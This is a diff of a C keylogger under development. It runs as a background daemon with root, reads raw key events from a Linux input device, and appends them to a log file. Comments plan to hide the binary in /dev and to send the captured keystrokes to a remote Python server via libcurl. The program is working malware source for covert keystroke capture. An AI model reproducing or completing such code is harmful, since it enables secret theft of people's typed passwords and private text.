@@ -1,7 +1,9 @@
+// REMOVE PRINTF AND CHANGE DIRECTORY TO /dev WHEN DONE
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/utsname.h>
 #include <linux/input.h>
+#include <errno.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -16,11 +18,11 @@ int main(void) {
 	struct utsname unameData;
 	uname(&unameData);
 	int fd;
-	pid_t process_id = 0;
-	pid_t sid = 0;
 	struct input_event ev;			/* using input_event so we know 
 									 * what we're reading from the 
 									 * event file */
+	pid_t process_id = 0;
+	pid_t sid = 0;
 	process_id = fork();			/* fork a child process */
 
 	if (process_id < 0) {
@@ -47,22 +49,21 @@ int main(void) {
 	close(STDOUT_FILENO);
 	close(STDERR_FILENO);
 
-	fp = fopen("log.txt", "a+"); 		/* daemon log */
-	evlog = fopen("evlog.txt", "a+");  	/* key log */
-	fd = open("/dev/input/event2", O_RDONLY|O_NONBLOCK);	/* key event file */
+	fp = fopen("log.txt", "a+"); 				/* daemon log */
+	evlog = fopen("evlog.txt", "a+");  			/* key log */
+	fd = open("/dev/input/event2", O_RDONLY);	/* key event file */
+	// findev = open('/proc/bus/input/devices', O_RDONLY);
+	// read(findev, )fakjdlajfkl;a
 /*
-* ADD SLEEP
 * DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
-* Send file out via TCP to python server for translation
+* Send file out via libcurl to python server for translation
 */
-	if (geteuid() != 0) {								/* check if user is root */
-		fprintf(fp, "ERROR: user not root");
-		return 1;
-	}
-
 	time_t curtime;
 	time(&curtime);
-
+	if (geteuid() != 0) {							/* check if user is root */
+		fprintf(fp, "%s -- ERROR: user not root\n", ctime(&curtime));
+		return 1;
+	}
 	if (evlog == NULL) {
 		fprintf(fp, "%s -- ERROR: evlog couldn't be opened\n", ctime(&curtime));
 		return 1;
@@ -76,15 +77,11 @@ int main(void) {
 
 	while(1) {
 		fflush(fp);
-
 		read(fd, &ev, sizeof(struct input_event));
-		if(ev.type == 1) {
+		if(1 == ev.type) {
 			fprintf(evlog, "%i,%i-", ev.code, ev.value);
 			fflush(evlog);
 		}
-		// else if(ev.type == 0) {
-		// 	sleep(1); 	// MUST ADD SLEEP!!!!!
-		// }
 	}
 
 	fclose(evlog);
